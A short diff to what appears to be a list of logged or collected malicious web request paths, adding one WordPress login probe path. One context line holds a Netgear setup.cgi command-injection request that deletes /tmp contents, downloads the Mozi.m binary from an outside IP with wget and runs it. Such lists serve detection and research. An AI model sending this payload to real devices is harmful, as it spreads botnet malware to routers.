@@ -19357,3 +19357,4 @@ http://www.google.com/
 /dspqhjbe.php?Fox=d3wL7
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.55.221.96:60883/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /NnhmySAiILbO
+/aleXus.php/cgi-bin/wp-login.php
